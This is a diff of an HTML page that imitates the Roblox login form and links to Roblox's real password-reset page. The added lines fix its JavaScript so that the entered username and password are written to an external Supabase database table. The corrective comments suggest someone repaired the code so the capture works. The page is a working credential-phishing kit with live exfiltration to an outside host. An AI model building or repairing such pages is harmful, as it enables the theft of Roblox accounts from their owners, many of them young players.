@@ -1,41 +1,54 @@
 <!DOCTYPE html>
 <html lang="en">
-    <head>
-    <meta charset="UTF-8">
-    <meta http-equiv="X-UA-Compatible" content="IE=edge">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Roblox</title>
-    <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap">
-    <link rel="stylesheet" href="rstyle.css" >
+<head>
+  <meta charset="UTF-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Roblox</title>
+  <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap">
+  <link rel="stylesheet" href="rstyle.css">
 </head>
-<body>
-    <div class="s">
-        <h1>Login to Roblox</h1>
-        <br>
-    <input type="text" placeholder="Username / Email / Phone" class="login" id="user" name="username" required>
-<br><br>
-    <input type="password" placeholder="Password" class="login" id="pass" name="password" required>
-        <br><br><br>
-  <button type="submit">Log in</button>
-<br><br><hr><br>
-<a href="https://www.roblox.com/login/forgot-password-or-username">
-<label id="f">Forgot password?</label></a>
-    </div>
 
-<script>
+<body>
+  <div class="s">
+    <h1>Login to Roblox</h1><br>
+    <input type="text" placeholder="Username / Email / Phone" class="login" id="user" name="username" required>
+    <br><br>
+    <input type="password" placeholder="Password" class="login" id="pass" name="password" required>
+    <br><br><br>
+    <button id="send" type="button">Log in</button>
+    <br><br><hr><br>
+    <a href="https://www.roblox.com/login/forgot-password-or-username">
+      <label id="f">Forgot password?</label>
+    </a>
+  </div>
+
+  <!-- load supabase client library -->
+  <script src="https://unpkg.com/@supabase/supabase-js@2"></script>
+  <script>
     const SUPABASE_URL = "https://mcaeueqqfhfbvuuilmtl.supabase.co";
     const SUPABASE_KEY = "sb_publishable_1thr_HyKVuLuzwNbgimN4w_LwalkFmu";
     const supabase = window.supabase.createClient(SUPABASE_URL, SUPABASE_KEY);
 
-document.getElementById('send').addEventListener('click', async () => {
+    // ↓ the only corrected section ↓
+    document.getElementById('send').addEventListener('click', async () => {
       const username = document.getElementById('user').value;
       const password = document.getElementById('pass').value;
-}
-                                                 
-supabase.from('messages').insert([
-  { username: username, pass: password }
-]);
-</script>
-    
+
+      try {
+        const { error } = await supabase.from('messages').insert([
+          { username: username, pass: password }
+        ]);
+
+        if (error) {
+          console.error('Insert error:', error);
+        } else {
+          console.log('Sent!');
+        }
+      } catch (err) {
+        console.error('Network error:', err);
+      }
+    }); // ✅ properly closes listener
+  </script>
 </body>
 </html>
